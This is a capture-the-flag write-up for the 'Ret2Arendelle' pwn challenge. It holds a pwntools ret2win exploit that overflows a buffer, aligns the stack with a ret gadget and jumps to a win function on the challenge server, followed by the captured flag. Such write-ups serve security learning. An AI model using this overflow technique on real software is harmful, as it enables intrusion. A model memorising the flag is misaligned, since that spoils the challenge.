Title: Ret2Arendelle

Description:
```
Disaster strikes when Anna's hair turns white!
Guide Kristoff and Sven to the place of home,
Point him to where he ought to alight,
Make haste before the soul turns frigid.

nc alpha.8059blank.ml 3001
nc beta.8059blank.ml 3001

Author: Jodie
```

Given files: [frozen.zip](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Pwn/Ret2Arendelle/frozen.zip "frozen.zip")

Given hints: Sven might need alignment before heading off.

Obviously Ret2Arendelle is a clue to Ret2Win.

Code to solve:

```python
from pwn import *
context.log_level='debug'

p = remote('alpha.8059blank.ml', 3001)
elf = context.binary = ELF('./frozen')
rop = ROP('./frozen')

# given when program executes
arendelle = 0x401216
offset = 32 + 8 # rbp + 8, found in GDB

p.sendlineafter("Many paths lie ahead, but which path will be the Return to Arendelle?\n", flat(
        b"A"*offset,
        rop.ret.address, # necessary to align the stack
        arendelle
))

p.interactive()
```

Flag: ACSI{w4rm_hug5}
